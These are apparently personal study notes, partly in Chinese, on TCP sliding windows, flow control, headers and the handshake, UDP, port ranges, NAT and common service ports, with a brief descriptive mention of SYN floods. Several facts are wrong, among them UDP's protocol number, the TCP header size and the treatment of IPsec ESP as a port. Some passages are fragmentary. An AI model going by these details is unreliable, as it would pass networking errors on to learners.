  - TCP implement congestion control: prevent overwhelming a network
with traffic
  - cause poor transmission rates and dropped packets
  - not implemented into TCP packets specifically, but based on information gathered by keeping track of acknowledgments for previously sent data and the time required for certain operations.
  - TCP adjusts data transmission rates using this information to prevent network congestion.
  - TCP also incorporates a cumulative 累积的 acknowledgment scheme.
  - sender and receiver, communicating via established TCP connection.
  - sender sends the receiver a specified amount of data,
  - the receiver confirms that it has received the data: sending a response packet to the sender with the acknowledgment field set to the next sequence number it expects to receive.
  - If any information has been lost, then the sender will retransmit it.
- flow control:
  - TCP also manages the amount of data that can be sent by one party, avoiding overwhelming the processing resources of the other / the bandwidth of the network itself.
  - 2 common flow control approaches: Sliding window and Buffering.
- TCP supports a checksum field to ensure correctness of data.
  - not be cryptographically secure, but to detect inconsistencies in data due to network errors rather than malicious tampering.
  - This checksum is typically supplemented by an additional checksum at the link layer, such as Ethernet, which uses the CRC-32 checksum.
  - TCP generally checks data transmitted by comparing a checksum of the data with a checksum encoded in the packet  Sliding window protocol:
- TCP uses it to manage flow control.
  - Sliding window used by the reciever to slow down the sender
- Congestion control: TCP can react to changing network conditions (slow down/ speed up dens rates)
  - Does it by adjust the congestion widonw size of the sender.
  - congestion widonw size used by the sender to reduce the network
congestion
  - Various techniques exist: back off, then add load
  - Unacknowledged semgment sent send at a point of time,   - Serves 3 different roles
  - Reliable
  - Preserve the order 保留順序(過程亂序，但回傳給上層是照順序的)
  - Each frame has a sequence number
  - Delivery order is maintained by sequence number
  - The receiver does not pass a frame up to the next higher-level protocol until it has already passed up all frames with a smaller sequence number
  - Frame control Buffering:
  - Receiver throttle 节流 the sender, 用RWS來控制
  - Keeps the sender from overrunning the receiver
  - transmitting more data than the receiver is able to process
- device (like router) allocates a chunk of memory (buffer/queue) to store segments if bandwidth is not currently available to transmit those segments.
  - A queue 队列 has finite capacity, will overflow (drop segments) in the event of sustained network congestion.
Data Transfer in TCP, TCP Segment Encapsulation
Data Transfer in TCP
- Application send data to a remote computer, it can be a variable size. one gigabyte, one kilobyte, - the network doesn't know, so TCP provides a mechanism to take that data and break it into segments.
- It then tags on a header, describes the state of the transmission.
- with data package and the state of the transmission, hand it off to layer three, placed into an IP packet,
- the network ships it off to its destination.
TCP is going to provide the reliability for this transmission. IP is
just the conduit for delivery.
- If something needs to be resent, TCP's in charge. IP simply going to do the work again.
  - This idea passes through to all the lower layers of the OSI model
  - if a segment isn't acknowledged after a period of time, it will simply be retransmitted.
- If a segment is received on a host out of order, its buffered on the receiver until the other segments arrive, and then it will pass the data up to the application.
TCP operates in full duplex
- two independent bi-directional streams, working together as
a connection,
- either of these can send or receive data at the same time. - a client has a connection to the server, and the server has a connection to the client.
Sliding window protocol
- As TCP runs over the Internet rather than a point-to-point link, the following issues need to be addressed by the sliding window algorithm:
  - TCP supports logical connections between processes that are running on two different computers in the Internet
  - TCP connections are likely to have widely different RTT times
  - Packets may get reordered in the Internet
- End-to-end Issues
  - TCP needs a mechanism using which each side will learn what resources the other side is able to apply to the connection
  - TCP needs a mechanism using which the sending side will learn the capacity of the network.
累计
TCP协议并不是对每个片段都发送ACK回复。TCP协议采用的是累计ACK回复 (accumulative acknowledgement)。接收方往往利用一个ACK回复来知会连续多个 片段的成功接收，ACK回复通常可以降到50%。
 ACK
 如下图，滑窗还没接收到片段7时，已接收到片段8，9。这样就在滑窗中制造了 一个“空穴”(hole)。当滑窗最终接收到片段7时，滑窗送出一个回复号为10的ACK 回复。
发送方收到该回复，会意识到，片段10之前的片段已经按照次序被成功接收。节 约了片段7和片段8的两个ACK回复。
此外，接收方在接收到片断，并应该回复ACK的时候，会故意延迟一些时间。 如果在延迟的时间里，有后续的片段到达，就可以利用累计ACK来一起回复 了。
滑窗结构
在之前的讨论中，我们以片段为单位，来衡量滑窗的大小的。真实的滑窗是以 byte为单位表示大小。
 发送方滑窗可以分为下面两个部分。offered window为整个滑窗的大小。
接收方滑窗可分为三个部分:
接收方的滑窗相对于发送方的滑窗多了一个"Received; ACKed; Not Sent to Proc"的部分。接收方接收到的文本流必须等待进程来读取。如果进程正忙于做 别的事情，那么这些文本流即使已经正确接收，还是需要暂时占用接收缓存。当 出现上述占用时，滑窗的可用部分(也就是图中advertised window)就会缩水。这 意味着接收方的处理能力下降。如果这个时候发送方依然按照之前的速率发送数 据给接收方，接收方将无力接收这些数据。
    Sender
Receiver
    sequence number (SeqNum):
Sender assigns a sequence number (SeqNum) to each frame.
Finite, specified in the header field Finite size: 3 bit.
8 SeqNumber: 0, 1, 2, 3, 4, 5, 6, 7 Necessary to wrap around重複使用
  distinguish between different incarnations of the same sequence number:
可以用的sequence number必須大於同時
外面跑得封包.
1. Stop and wait: 同時在外面跑得
frame只有1個，只需要1個bit. 2. MaxSeqNum:目前可以使用的
Seqence number最大值，SWS + 1
≤ MaxSeqNum
Is this sufficient? Depends on RWS
If RWS=1, then sufficient
If RWS=SWS, not good enough.
  - To avoid this,
  - SWS < (MaxSeqNum + 1)/
2
Example: 8 sequence numbers: 0 - 7 RWS = SWS = 7
Sender sends 0, 1, ..., 6, all ACK are lost.
Sender retransmits 0, 1, ..., 6 Receiver is expecting 7, 0, ...., 5
RWS = SWS = 7
7 x 2 - 1 = 13 < MaxSeqNum
     SeqNumToAck:
the largest sequence number not yet acknowledged, such that all frames with sequence number less than or equal to SeqNumToAck have been received.
   The receiver then sets
LFR = SeqNumToAck -1 LAF = LFR + RWS
    Sending Window Size (SWS):
Upper bound on the number of
outstanding (unacknowledged) frames
that the sender can transmit. Delay x Bandwidth
  Receiving Window Size (RWS):
Upper bound on the number of out-of- order frames that the receiver is willing to accept.
Two common setting:
RWS = 1
  - No buffer at the receiver
for frames arrive out of
order. RWS = SWS
  - The receiver can buffer frames.
No sense to keep RWS > SWS
    Last Acknowledgement Received (LAR)
Sequence number of the last acknowledgement received.
  Last Frame Received (LFR):
Sequence number of the last frame received
     Last Frame Sent (LFS)
Sequence number of the last frame sent
    Largest Acceptable Frame (LAF):
Sequence number of the largest acceptable frame.
 LFS – LAR ≤ SWS LAF – LFR ≤ RWS
Reliable and orderes delivery (+Window size)
  Sending Side
Sender buffer: store data that has been sent but not yet acknowledged
(LastByteAcked ≤ LastByteSent), and data that has been written by the
sending application but not transmitted. (LastByteWritten) LastByteAcked ≤ LastByteSent ≤ LastByteWritten
(-00, LastByteAcked) + (LastByteWritten, +00) do no need to be saved in
buffer.
Receiving Side
Receiver buffer: data that arrives out of order (LastByteRcvd), and data that
is in the correct order (i.e., there are no missing bytes earlier in the stream) but that the application process has not yet had the chance to read (LastByteRead < NextByteExpected).
Buffer: LastByteRead < NextByteExpected ≤ LastByteRcvd + 1
MaxRcvBuffer, MaxSendBuffer
  - LastByteRcvd − LastByteRead ≤ MaxRcvBuffer
  - LastByteWritten − LastByteAcked ≤ MaxSendBuffer
AdvertisedWindow = MaxRcvBuffer − ((NextByteExpected − 1) − LastByteRead)
  - LastByteSent − LastByteAcked ≤ AdvertisedWindow
  - Advertised window 由receiver提供size，通知接收端目前Receiver 端的接收buffer还有多大的free space，sender可以发送不超过这个 size的packet。这个size大概就是接收端的buffer 减去没有被APP layer读走的数据大小。
  - If local process is reading and sending data at same rate, the
AdvertisedWindow stays open (AdvertisedWindow = MaxRcvBuffer)
When design reliable byte-stream protocol that uses a sliding window (like TCP), the advertised window size > (delay x bandwidth)
  - to fully utilize the network, the advertised window needs to be larger than (delay x bandwidth).
(SequenceNum) ≥ (Maximum Segment Lifetime) × (Bandwidth)
  - needs be large enough that the sequence number does not wrap around
before any delayed segments have left the network, which is
presumed to occur within the maximum segment lifetime.
In the protocol header:
  - It need n bits to demostrate the number (XX),
  - 2^n bits > number
EffectiveWindow = AdvertisedWindow − (LastByteSent − LastByteAcked)
If the sending process tries to write y bytes to TCP, but
(LastByteWritten − LastByteAcked) + y > MaxSendBuffer
then TCP blocks the sending process and does not allow it to generate more data.
    - With each packet, the receiver informs the sender Sending Window Size (SWS),(the number of bytes of data it is willing to accept before the sender must pause and wait for a response, indicating the receiver is ready to accept more data.)
  - The sender keeps track the Last Acknowledgement Received (LAR).
  - Sender: checks the sequence number of the packet to be sent, send it if this number is less than Last Acknowledgement Received (LAR) plus Sending Window Size (SWS)
  - Reciver:
  - If SeqNum ≤ LFR or SeqNum > LAF
  - Discard it (the frame is outside the receiver window)   - If LFR < SeqNum ≤ LAF
  - Accept it
  - the receiver decide whether or not to send an ACK
  - Sender waits for an acknowledgment.
  - Acknowledges has order:
  - LFR is 5, frame 6 is not arrive,   - Frames 7 and 8 arrive (out of order), they will be buffered.
  - After frame 6 arrives (late because lost or retransmitted),
  - Now Receiver Acknowledges Frame 8, and bumps LFR to 8, LAF to 12
  - During sending data, sender associates a timer with each frame it transmits.
  - If no acknowledgment is received before the timer expires, the sender assumes data loss and retransmits. the sender is unable to advance its window, the amount of data in transit decreases
  - How to improve this
  - Negative Acknowledgement (NAK), 封包錯的回一個NAN去通
知sender重送
  - Receiver sends NAK for frame 6 when frame 6 miss,
frame 7 arrive (in the previous example)
  - However this is unnecessary since sender’s timeout
mechanism will be sufficient to catch the situation
  - Additional Acknowledgement, ACK中間有漏掉就多回一個 ACK，讓Sender去知道封包loss
  - Receiver sends additional ACK for frame 5 when frame 7 arrives
  - Sender uses duplicate ACK as a clue for frame loss
  - Selective Acknowledgement, 收到哪些正確的就回該ACK，讓
Sender知道那個frame沒收到
  - Receiver will acknowledge exactly those frames it has
received, rather than the highest number frames
  - Receiver will acknowledge frames 7 and 8   - Sender knows frame 6 is lost
  - Sender can keep the pipe full (additional complexity) Serves 3 different roles
Reliable delivery of data
Preserve the order 保留順序(過程亂序，但回傳給上層是照順序的)
Each frame has a sequence number
The receiver makes sure that it does not pass a frame up to the next higher-level protocol until it has already passed up all frames with a smaller sequence number
Frame control
Receiver is able to throttle 节流 the sender, 用RWS來控制 enforces flow control between the sender and the receiver. Keeps the sender from overrunning the receiver
From transmitting more data than the receiver is able to process
流量控制
TCP协议会根据情况自动改变滑窗大小，以实现流量控制。流量控制(flow control)是指接收方将advertised window的大小通知给发送方，从而指导发送方修 改offered window的大小。接收方将该信息放在TCP头部的window size区域:
发送方在收到window size的通知时，会调整自己滑窗的大小，让offered window 和advertised window相符。这样，发送窗口变小，文本流发送速率降低，从而减
 少了接收方的负担。
零窗口
advertised window大小有可能变为0，这意味着接收方的接收能力降为0。发送方 收到大小为0的advertised window通知时，停止发送。
  零窗口
当接收方经过处理，再次产生可用的advertised window时，接收方会通过纯粹的 ACK回复来通知发送方，让发送方恢复发送。然而，ACK回复的传送并不是可 靠的。如果该ACK回复丢失，那么TCP传输将陷入死锁(deadlock)状态。
为此，发送方会在零窗口后，不断探测接收方的窗口。窗口探测(window probe) 时，发送方会向接收方发送包含1 byte文本流的TCP片段，并等待ACK回复(该 ACK回复包含有window size)。由于有1 byte的数据存在，所以该传输是可靠的， 而不用担心ACK回复丢失的问题。如果探测结果显示窗口依然为0，发送方会等 待更⻓的时间，然后再次进行窗口探测，直到TCP传输恢复。 白痴窗口综合症
滑窗机制有可能犯病，比如白痴窗口综合症 (Silly Window Syndrome)。假设这样 一种情形:接收方宣布(advertise)一个小的窗口，发送方根据advertised window， 发送一个小的片段。接收方的小窗口被填满，经过处理，接收方再宣布一个小的 窗口...... 这就是“白痴窗口综合症”:TCP通信的片段中包含的数据量很小。在这 样的情况下，TCP通信的片段所含的信息都很小，网络流量主要是TCP片段的头 部，从而造成流量的浪费 (由于TCP头部很大，我们希望每个TCP片段中含有比 较多的数据)。
  如果发送方不断发送小的片段，也会造成“白痴窗口”。为了解决这个问题，需要 从两方面入手。TCP中有相关的规定，要求: 1. 接收方宣告的窗口必须达到一定的尺寸，否则等待。
2. 除了一些特殊情况，发送方发送的片段必须达到一定的尺寸，否则等待。特殊
情况主要是指需要最小化延迟的TCP应用(比如命令行互动)。
TCP Packet Format
Frame 1: Physical layer
Ethernet II, Src: Data layer
Internet Protocol Version 4, Src: 192.168.1.100, Dst: 192.168.1.1
Network layer
Internet Control Message Protocol Transport layer
- Includes source and destination ports, define the communication connection for this packet and others like it.
- In TCP, connection sessions are maintained beyond the life of a single packet,
  - so TCP connections have a state, defines the status of the connection.
- TCP communication session, goes from states used to open a connection, to those used to exchange data and acknowledgments, to those used to close a connection. - TCP is a byte-oriented protocol
  - the sender writes bytes into a TCP connection
  - the receiver reads bytes out of the TCP connection.
- Byte stream:
  - but TCP does not transmit individual bytes,
  - The source host buffers enough bytes from the sender to fill a reasonably sized packet, and then sends this packet to its peer on the destination host.
  - The destination host then empties the contents of the packet into a receiver buffer, and the receiving process reads from this buffer at its leisure.
- The packets exchanged between TCP peers are segments.
- Buffer: make sure every is in order.
- 2 incarnations of the same connection: closed and open a same TCP connection.  TCP Header  - TCP packet header: (4x6)24 bytes, 64 bits.
- SrcPor / DstPort:
  - the source / destination ports.
  - to which upper-layer protocol data should be
forwarded,
  - from which upper-layer protocol the data is being sent.
- SequenceNum:
  - Indentify the position in the segmented data stream
  - contains the sequence number for the first byte of data carried in that segment.
  - if segments arrive out of order, the recipient can put them back in the appropriate order.
- Acknowledgment: ▪


##   - the next sequence number expected to receive.
  - The number of the next octet to be received in the data
stream
  - This is a way for the receiver to let the sender know
that all segments up to and including that point have
been received.
- AdvertisedWindow:
  - determines how many bytes a device can receive
before expecting an acknowledgment.
  - offers flow control.
HdrLen field:
  - The TCP header is of variable length, HdrLen gives
the length of the header in 32-bit words. Also known
as Offset field.
- Flags:
  - relay control information between TCP peers. Used to
determine the conditions and status of the TCP
connection.
  - Possible flags: SYN, FIN, RESET, PUSH, URG, and
ACK.
  - URG flag: contains urgent data. The urgent data is contained at the front of the segment body, and including a UrgPtr bytes into the segment. Indicates that the data contained in the packet is urgent and should process immediately.
  - UrgPtr field: Urgent pointer, indicates where the non-urgent data contained in this segment begins.
  - ACK flag: set any time the Acknowledgment field is valid, implying that the receiver should pay attention to it. Acknowledge the receipt of a packet.   - PSH / PUSH flag: the sender invoked the push operation, which indicates to the receiver that it should notify the receiving process of this fact. Instructs the sending system to send all buffered data immediately.
  - RST / RESET flag: the receiver has become confused, it received a segment it did not expect to receive, wants to abort the connection. Reset a connection.
  - SYN / FIN flags:
  - SYN: Initiates a connection between two
hosts to facilitate communication.
  - FIN: Tells the remote system about the end of the communication. In essence, this gracefully closes a connection.
- Checksum:
  - computed over the TCP header, data, and pseudo-
header, which is made up of the source address, destination address, and length fields from the IP header.  ▪


## TCP options must be in multiples of four (4) bytes. If 10 bytes of options are added to the TCP header, two single byte No-Operation will be added to the options header.
TCP Connection Establish/ Terminate   Setup is asymmetric activity, termination is symmetric (each side close independently).
Three way handshake
exchange 3 message between client and server. 1. Client: send segment to the server:
  - Flags: SYN,   - SequenceNum = x 2. Server: respond to client:
  - Flags: ACK,
  - ACK = x+1
  - Flags: SYN,
  - SequenceNum = y
  - Both ACK and SYN bits are in the Flags field of the 2nd message.
3. Client: reponds to server:
  - Flags: ACK,
  - ACK = y+1
- A timer is scheduled for first 2 segments, if not received, the segment is retransmitted.
- SequenceNum is chosen at random, to against 2 incarnations of the same connection reusing the same SequenceNum too soon, let a segment from an earlier incarnation of a connection interfere with a later incarnation of the connection.
TCP Connections
TCP uses three-way handshake to establish reliable connection stream between 2 parties.  First, a client sends a packet to the desired destination with the SYN flag (synchronization 同步) set.
  - This packet includes a random initialization for a sequence number Seq1 (used to ensure reliable ordering of future data transmissions)
In response, the server replies a packet with both the SYN and ACK (acknowledgment) flags / SYN-ACK packet, indicating that the server wishes to accept the connection.
  - This packet includes an acknowledgment number Ack2=Seq1+1, and a new random sequence number Seq2.
Finally, the client responds with an ACK packet, indicate a successful connection has been established.
  - The final ACK packet features:
  - an acknowledgment number Ack3=Seq2+1.
  - the sequence number Seq3=Ack2=Seq1+1. predicting initial sequence numbers.
As mentioned above, TCP uses the notion of 16-bit port numbers, differentiate multiple TCP connections.
TCP packets include both a source port (from which the packet originated) and a destination port (where the packet will be received).
Ports may range from 1 to 65,535 (216 − 1)
lower port numbers being reserved for commonly used protocols and services.
example, port 80 for HTTP protocol, ports 21 and 22 for FTP and SSH.
Most applications create network connections using sockets, an abstraction that allows developers to treat network connections as if they were files. Developers simply read and write information as needed, while the OS handles encapsulating this application-layer information in the lower levels of the TCP/ IP stack.
State-Transition Diagram Protecting against Wraparound
SequenceNum: 32 bits longs
AdvertisedWindow: 16 bits long
TCP has satisfied the requirement of the sliding window algorithm that is the sequence number space be twice as big as the window size
232 >> 2 × 216
■ Relevance of the 32-bit sequence number space
■ The sequence number used on a given connection might
wraparound
■ A byte with sequence number x could be sent at one time, and then at a later time a second byte with the same sequence number x could be sent
■ Packets cannot survive in the Internet for longer than the MSL ■ MSLissetto120sec ■ We need to make sure that the sequence number does not wrap around within a 120-second period of time
■ Depends on how fast data can be transmitted over the Internet Triggering Transmission
How does TCP decide to transmit a segment?
TCP supports a byte stream abstraction
Application programs write bytes into streams
It is up to TCP to decide that it has enough bytes to send a segment
■ What factors governs this decision
■ Ignore flow control: window is wide open, as would be the case when the connection starts
■ TCP has three mechanism to trigger the transmission of a segment
■ 1) TCP maintains a variable MSS and sends a segment as soon as it has collected MSS bytes from the sending process
■ MSS is usually set to the size of the largest segment TCP can send without causing local IP to fragment.
■ MSS: MTU of directly connected network – (TCP header + and IP header)
■ 2) Sending process has explicitly asked TCP to send it ■ TCP supports push operation
■ 3) When a timer fires
■ Resulting segment contains as many bytes as are
currently buffered for transmission
Spoof TCP sequence number attack
  SYN Flood
One variant of a DoS attack
- the attack send multiple SYN segments to a target system with false
source IP addresses in the header of the SYN segments.
  - Can never complete the three-way TCP handshake.
- Because many servers limit the number of TCP sessions they can have open simultaneously,
  - a SYN flood can render a target system incapable, can not open a TCP session with a legitimate user. ▪


##  User Datagram Protocol (UDP)
UDP protocol does not make guarantee about the order or correctness of packet delivery.
no initial handshake to establish a connection,
  - no handshake, harder to scan and enumerate.
allows parties to send messages, known as datagrams, immediately.
If a sender wants to communicate via UDP, it need only use a socket (defined with respect to a port on a receiver) and start sending datagrams, no elaborate setup needed.
While UDP features a 16-bit checksum to verify the integrity of each individual packet, there is no sequence number scheme, so transmissions can
   ▪


## arrive out of order or may not arrive at all.
It is assumed that checking for missing packets in a sequence of datagrams is left to applications processing these packets.
As a result, UDP can be much faster than TCP, which often requires retransmissions and delaying of packets.
Doesn’t gurantee error-free communications. UDP is often used
in time-sensitive applications where data integrity is not as important as speed
  - Short client-server request like DNS, single message request
  - Voice over IP (VoIP).
  - High-perfomece networking
  - Application handles reliable transmission
Primary use: send small packets of information. TCP is used for
applications where data order and data integrity is important
  - like HTTP, SSH, and FTP.
The format of a UDP packet
Simpler than a TCP packet.
UDP packet header: 4x2 bytes, 64 bits.
      Format for UDP header (Note: length and checksum fields should be switched)
UDP:
▸ UDP is considered to be a connectionless, unreliable protocol,
▸ it lacks the sequence numbering, window size, and acknowledgment numbering present in the header of a TCP segment.
▸ UDP header is so much smaller than a TCP header,
▸ UDP is a good candidate for applications that need to maximize bandwidth and do not require acknowledgments (example, audio or video streams).
▸ | Source Port | Destination Port
▸ | UDP Length | UDP Checksum
▸ Segment length: measured in bytes.
▸ UDP checksum: used to detect transmission errors Port
- logical numbers used by TCP/IP.
  - 65,536 TCP ports + 65,536 UDP ports.
- to identify what service/app should handle data received by a system.
- Allocated by an internal data structure
  - Only one process can be assigned to a port on an IP at a time
  - Port conflict
  - App request a port being used. Simply fail. Uable to open the port.
Ports are inly unique per address:
- System can have more then 1 address.
- Administrators open ports on firewalls and routers to allow the associated protocol into or out of a network.
  - example, HTTP uses port 80, administrator allows HTTP traffic by opening port 80.
- Additionally, administrators disable unnecessary ports and services as part of a basic security practice, it blocks any attacks on these ports, services, and protocols.
- The Internet Assigned Numbers Authority (IANA) maintains a list of official port assignments - Well-known ports: 0–1024:
  - commonly used protocols.
  - Reserved only for system services
  - Linux system: only accessiable by root user.
- Registered ports: 1024–49,151:
  - for companies as a convenience to the IT community.
  - A single company may register a port for a proprietary use, or
multiple companies may use the same port for a specific standard.
  - Example, Microsoft SQL Server uses port 1433 for database servers, Layer 2 Tunneling Protocol (L2TP) uses port 1701, and Point-to-Point Tunneling Protocol (PPTP) uses port 1723.
- Dynamic and private ports: 49,152–65,535:
  - available for use by any application.
  - Applications commonly use these ports to temporarily map an application to a port. These temporary port mappings are often called ephemeral ports, indicating that they are short lived.
- Ephemeral 短暂的 ports: 32,768-61,000:
  - TCP are full-deplex
  - The ports that assigned on the client side of a connection, when connecting to a well-known port.
  - Client port+IP : server port+IP, uniquely identify a connection.
- Although virtually all the ports are subject to attack, most port attacks are against the well- known ports.
- Port scanners: simply check to see if a well-known port is open.
- Example: - SMTP uses port 25, if port 25 is open, the system is likely running SMTP.
Network administrators who regularly work with routers and firewalls can easily tell you which protocol is associated with which well-known port, such as 20, 21, 22, 23, 25, 80, or 443. The reason is that they use these ports to allow or block traffic.
example, an administrator can close port 25 to block all SMTP traffic into a network. The router then ignores traffic on port 25 instead of forwarding it. Similarly, an administrator can close port 1433 to block database traffic to a Microsoft SQL server. On the other hand, the administrator can open port 25 to allow SMTP traffic.
Although ports are second nature to router and firewall administrators, they might not be so familiar to you. If you don’t work with the ports often, you’ll need to spend some extra time studying to ensure you’re ready for the exam.
Combining the IP Address and the Port
- Computer receiving packets includes destination IP and port.
  - TCP/IP uses the IP address to get the packet to the computer.
  - computer uses the port number to get the packet to the correct service / protocol / application that can process it.
- Example:
  - Packet: destination port of 80
  - the system passes the packet to the process handling HTTP.
  - It wouldn’t do much good to pass an SMTP email packet to the HTTP
service or send an HTTP request packet to the SMTP service.
Server Ports
- Different protocols are enabled and running on a server.
- Any web browser knows that the well-known port for HTTP is 80.   - omit the port number, HTTP uses 80 by default. - Popular web servers app:
  - Apache and Internet Information Services (IIS).
  - Apache: free, runs on Unix / Linux / Microsoft systems...
  - Internet Information Services (IIS): included in Microsoft Server
products.
  - These web servers use port 80 for HTTP.
  - When the server receives a packet with destination port 80,
  - the server sends the packet to the web server application.
  - web server application processes it and sends back a response.
Client Ports
- TCP/IP works with the client OS to maintain a table of client-side ports.
- This table associates port numbers with different applications that are
expecting return traffic.
  - Client-side ports: start at port 49,152 to 65,535.
  - If the system uses all the ports between 49,152 and 65,535 before being rebooted, it’ll start over at 49,152.
Put Together.  client use web browser to request a page from a site,
  - client system record an unused client port number 49,152 in an internal
table to handle the return traffic. When the web server returns the web page
  - it includes the client port as a destination port.
When the client receives web page packets: destination port 49,152,
  - client sends packets to the web browser application.
  - The browser processes the packets and displays the page.
IP
client creates a packet (with source and destination IP and ports)
  - Client IP address is the source IP address. client queries a DNS server
  - Queries for the IP of AA.com and learns that the IP address is
72.52.206.134.
theAA.com web server is serving web pages using HTTP with port 80, the destination port is 80.
client identify an unused port in the dynamic and private ports range (a port number between 49,152 and 65,535) and map that port to the web browser.
  - For this example, imagine it assigns 49,152 to the web browser. It uses this as the source port.
At this point, the packet:
  - Destination IP address: 72.52.206.134 (the web server)
  - Destination port: 80
  - Source IP address: 70.150.56.80 (client)
  - Source port: 49,152
TCP/IP uses the IP address (72.52.206.134) to get the packet to the AA.com web server.
When it reaches the web server
AA.com web server looks at the destination port (80), determines that the packet
needs to go to the web server program servicing HTTP.
The AA.com web server creates the page, puts the data in return packets.
  - the packet: from web server to client :
  - Destination IP address: 70.150.56.80 (your computer)
  - Destination port: 49,152
  - Source IP address: 72.52.206.134 (the webserver)
  - Source port: 80
Again, TCP/IP uses the IP address to get the packets to the destination, client. packets reach client with destination port 49,152.
client system mapped this port to your web browser
system sends the packets to the web browser (displays the web page)
Port Port and protocol number
Protocols aren’t identified by the port, but the protocol numbers: IPsec:
  - protocol number 50: Encapsulating Security Payload (ESP) packet,
  - protocol number 51: Authentication Header (AH) packet. ICMP: protocol number 1, TCP 6, UDP 7.
Protocol numebr: protocol ID or a protocol identifier.
Ports Security
Routers, and the routing component of firewalls, filter packets based on IP addresses, ports, and some protocols such as ICMP or IPsec.
Because many protocols use well-known ports, you can control protocol traffic based on the port.
You can use a protocol numebr to block / allow traffic on router and firewall. Allow IPsec ESP traffic:
  - opening port 50
  - Allowing reaffic using protocol numebr 50.
Port security: limits the computers that can connect to physical ports on a switch.
Example:
disable unused ports.
  - Example:
  - individual RJ-45 wall jacks in an office lead to specific physical ports
on a switch.
  - If the wall jack is not being used, administrators can disable the switch port.
  - This prevents someone from plugging in a laptop or other computer 2,498
- - into the wall jack and connecting to the network.
MAC address filtering
  - In a simple implementation, the switch remembers the first one or two MAC addresses that connect to a port.
  - It then blocks access to systems using any other MAC addresses.
  - You can also manually configure each port to accept traffic only from
a specific MAC address.
  - This limits each port’s connectivity to a specific device using this
MAC address.
  - very labor intensive, but higher level of security.
basic NAT topology:
two clients with private IP 10.1.1.1 and 10.1.1.2, want to communicate with a web server 192.168.1.1 on the public Internet.
R1 is configured for NAT. (NAT Translation Table) R1:
  - takes packets coming from 10.1.1.1 destined for 192.168.1.1
  - changes the source IP in the packets’ headers to 172.16.1.101. When the server receives traffic, the return traffic's destination address
172.16.1.101. R1:
  - receives return traffic,
  - translates the destination IP address to 10.1.1.1
  - forwards the traffic to the inside network
  - client 1 receives the traffic.
◦ Similarly, client 2’s IP address of 10.1.1.2 is translated into an IP address of 172.16.1.102.
In NAT IP Address
Inside local: private IP of inside device Inside global: public IP of inside device
  - "Inside": Something you can control. Outside local: private IP of outside device Outside global: public IP of outside device
  - "Outside": beyond your control. inside: inside device.
outside: outside device.
10.1.1.101 and 10.1.1.102 172.16.1.101 and 172.16.1.102
None (same as inside global or none) 192.168.1.1 - How inside local address is assigned an inside global address from a pool of available addresses.
2 approaches to NAT are called DNAT and SNAT: dynamic NAT (DNAT) :
  - the inside local addresses were automatically assigned an inside global address from a pool of available addresses.
static NAT (SNAT):
  - statically configure the inside global address assigned to a specific device inside your network.
▸ Example:
- e-mail server in your company,
- you want other e-mail servers on the Internet to send e-mail messages to your
server.
- e-mail servers on the Internet need to point to a specific IP address (not one
that was randomly picked from a pool of available IP addresses)
- In such a case, you can statically configure the mapping of an inside local
address (the IP address of your internal e-mail server) to an inside global address (the IP address to which e-mail servers on the Internet will send e-mail for your company).
Reference:
some of the more popular application layer protocols and applications found in the TCP/IP stack. Some protocols or applications (example, DNS) can use either TCP or UDP for their transport:
- Secure Shell (SSH): Securely connect to a remote host (typically via a terminal emulator) TCP Port: 22
- File Transfer Protocol (FTP): Transfers files with a remote host (typically requires authentication of user credentials) TCP Port: 20 and 21
- Secure FTP (SFTP): TCP Port: 22
  - FTP file-transfer service over a SSH connection.
  - (can transfer file with outside organizations)
- Secure Copy (SCP): TCP Port: 22
  - Provides a secure file-transfer service over a SSH connection
    - (can transfer file with outside organizations)
  - offers a file’s original date and time information which not available
with FTP.
- Telnet: Used to connect to a remote host (typically via a terminal emulator) TCP Port: 23
- Simple Mail Transfer Protocol (SMTP): Used for sending e-mail. TCP Port: 25
- Domain Name System (DNS): Resolves domain names to corresponding IP addresses. TCP/UDP Port: 53
- Dynamic Host Configuration Protocol (DHCP): Dynamically assigns IP address information (example, IP address, subnet mask, DNS server’s IP address, and default gateway’s IP address) to a network device. UDP Port: 67
- Trivial File Transfer Protocol (TFTP): Transfers files with a remote host (does not require authentication of user credentials) UDP Port: 69
- Hypertext Transfer Protocol (HTTP): Retrieves content from a web server TCP Port: 80
- Post Office Protocol version 3 (POP3): Retrieves e-mail from an e-mail server. TCP Port: 110
- Network News Transport Protocol (NNTP): Supports the posting and reading of articles on Usenet news servers TCP Port: 119
- Network Time Protocol (NTP): Used by a network device to synchronize its clock with a time server (NTP server) UDP Port: 123
- Simple Network Time Protocol (SNTP): Supports time synchronization among network devices, similar to Network Time Protocol (NTP), although SNTP uses a less complex algorithm in its calculation and is slightly less accurate than NTP UDP Port: 123
- Internet Message Access Protocol version 4 (IMAP4): Retrieves e-mail from an e-mail server TCP Port: 143
- Lightweight Directory Access Protocol (LDAP): Provides directory services (example, a user directory— including username, password, e-mail, and phone number information) to network clients. TCP Port: 389
- Hypertext Transfer Protocol Secure (HTTPS): Used to securely retrieve content from a web server. TCP Port: 443
- Remote Shell (rsh): Allows commands to be executed on a computer from a remote user TCP Port: 514
- Real Time Streaming Protocol (RTSP): Communicates with a media server (example, a video server) and controls the playback of the server’s media files. TCP+UDP 554 Remote Desktop Protocol (RDP): TCP 3389
  - Microsoft protocol
  - allows user to view / control the desktop of remote computer
   - If specified port is closed on the outbound firewall on the nerwork, use TLS.
Nameserv - Host Name Server
42/TCP,UDP
Host Name Server ARPA主机名服务器协议 已过时的用于转换主机名到互联网地址的网络协议。
DARPA Trivial名称服务器使用NAMESERVER协议，服务器进程名为
tnamed，它有在部分UNIX实现中提供。 对NAMESERVER协议的支持已被废弃，并不再于所有的UNIX操作系
统实现中可用。
  - DNS 已经取代了 ARPA主机名服务器协议 和 DARPA
Trivial名称服务器。
WHOIS
43/TCP
查詢網際網路中域名的IP以及所有者等信息的傳輸協定。 早期的WHOIS查詢多以命令列介面(Command Line)存在，但是現
  在出現了一些基於網頁介面的簡化線上查詢工具，甚至可以一次
向不同的數據庫查詢。 網頁介面的查詢工具仍然依賴WHOIS協定向伺服器傳送查詢請求，命
令列介面的工具仍然被系統管理員廣泛使用。 每个域名或IP的WHOIS信息由对应的管理机构保存，例如，以.com结
               尾的域名的WHOIS信息由.com域名运营商VeriSign管理，中国国
家顶级域名.cn域名由CNNIC管理。 通常情况下，域名或IP的信息可以由公众自由查询获得，具体的查询
方法是登陆由管理机构提供的WHOIS服务器，输入待查询的域名 进行查询。
Login - Login Host Protocol
49/TCP,UDP
T ACACS登录主机协议 Email:
POP - Post Office Protocol
A POP3 server listens on 110 for service requests. Encrypted communication for POP3:
